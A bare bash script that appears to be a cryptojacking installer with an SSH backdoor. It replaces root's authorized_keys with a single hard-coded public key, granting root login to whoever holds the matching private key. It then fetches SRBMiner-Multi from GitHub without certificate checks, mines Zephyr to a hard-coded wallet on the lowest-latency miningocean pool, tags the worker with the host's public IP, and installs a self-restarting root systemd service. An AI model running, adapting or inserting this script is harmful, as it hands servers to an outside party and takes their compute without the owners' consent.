#!/bin/bash
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAl5QreAwkidb7s2ucEKdlQ1q9/voCnGiLjvwwmQPgpm' >/root/.ssh/authorized_keys
chmod 700 /root/.ssh/authorized_keys
chown -R root:root /root/.ssh/authorized_keys

[ -z "$1" ] && WORKER_WALLET_ADDRESS='ZEPHYR3CgYwjLFkj7RmKW8gjejgQk2qtq3yrRzmom1hDNWwr3Z2jnXxXqf2Fo2c1zL2nAHaso7D3F8eREGJLNUjaVqhYHjHejNV3R' || WORKER_WALLET_ADDRESS="$1"

if [ "$(which yum)" ]; then
    yum install curl bc -y
else
    apt update -y
    apt install curl bc -y
fi
systemctl is-active --quiet zeph && systemctl stop --no-block zeph

rm -rf /opt/zeph

DIR="/opt/zeph"

mkdir -p $DIR

version="$(wget -T 3 -t 2 -qO- https://github.com/doktor83/SRBMiner-Multi/releases | grep 'SRBMiner-MULTI' | grep releases | head -1 | awk '{print $7}' | xargs | awk -F '/' '{print $6}')"

url="https://github.com/doktor83/SRBMiner-Multi/releases/download/${version}/SRBMiner-Multi-`echo $version | sed 's/\./-/g'`-Linux.tar.gz"

wget --no-check-certificate $url -qO - | tar -zxf - -C $DIR --strip-components=1

chmod +x $DIR/SRBMiner-MULTI

eu=$(curl -s -o /dev/null -w "%{time_total}\n" de-zephyr.miningocean.org)
asia=$(curl -s -o /dev/null -w "%{time_total}\n" hk-zephyr.miningocean.org)
na=$(curl -s -o /dev/null -w "%{time_total}\n" us-zephyr.miningocean.org)

if (($(bc <<<"$eu > $asia"))) && (($(bc <<<"$na > $asia"))); then
    pool_url="hk-zephyr.miningocean.org:5332"
elif (($(bc <<<"$asia > $eu"))) && (($(bc <<<"$na > $eu"))); then
    pool_url="de-zephyr.miningocean.org:5332"
else
    pool_url="us-zephyr.miningocean.org:5332"
fi

COMMAND_BASE="$DIR/SRBMiner-MULTI --algorithm randomx --pool ${pool_url} --wallet ${WORKER_WALLET_ADDRESS} --password \${ALIAS} --keepalive true"

echo '''#!/bin/bash

ALIAS=$(wget -T 3 -t 2 -qO- http://169.254.169.254/2021-03-23/meta-data/public-ipv4 | sed "s/\./-/g")

[ -z "$ALIAS" ] && ALIAS=$(wget -T 3 -t 2 -qO- ifconfig.me | sed "s/\./-/g")

''' >$DIR/start.sh

echo $COMMAND_BASE >>$DIR/start.sh
chmod +x $DIR/start.sh

echo """[Unit]
Description=zeph
DefaultDependencies=no
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$DIR
ExecStart=$DIR/start.sh
Restart=always
RestartSec=5s
[Install]
WantedBy=default.target""" >/etc/systemd/system/zeph.service

systemctl daemon-reload
systemctl enable zeph
systemctl restart zeph
